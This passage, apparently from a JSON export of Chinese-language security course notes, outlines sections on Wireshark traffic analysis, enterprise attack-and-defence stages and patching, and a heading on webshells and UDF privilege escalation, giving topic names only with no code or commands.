id=\"315-流量分析实战\"><a class=\"anchor\" href=\"#315-流量分析实战\">#</a> 3.15 流量分析实战</h1>\n<p>wireshark 的基本介绍</p>\n<ul>\n<li>只能查看包，无法拦截修改</li>\n<li>filter 的规则</li>\n<li>功能</li>\n</ul>\n<h1 id=\"316-企业攻防实战\"><a class=\"anchor\" href=\"#316-企业攻防实战\">#</a> 3.16 企业攻防实战</h1>\n<ul>\n<li>\n<p>攻防</p>\n<p>攻击 --&gt; web 渗透 -- 主机 --&gt; 内网渗透</p>\n<p>防护 --&gt; web 安全防护 -- 系统安全防护 -- 安全设备防护等</p>\n</li>\n<li>\n<p>如何做好一个白帽子：要具备黑帽子技术同时具备防护的技术</p>\n</li>\n<li>\n<p>如何做好防护：在攻击前打好漏洞补丁</p>\n<p>web 代码、系统漏洞、中间件的配置、数据库</p>\n</li>\n</ul>\n<p>框架熟知</p>\n<h1 id=\"317-揭秘黑客如何通过木马控制目标服务器-webshell\"><a class=\"anchor\" href=\"#317-揭秘黑客如何通过木马控制目标服务器-webshell\">#</a> 3.17 揭秘黑客如何通过木马控制目标服务器 - webshell</h1>\n<p>udf 提权</p>\n",
            "tags": [
                "信息安全"
            ]
        }
    ]
}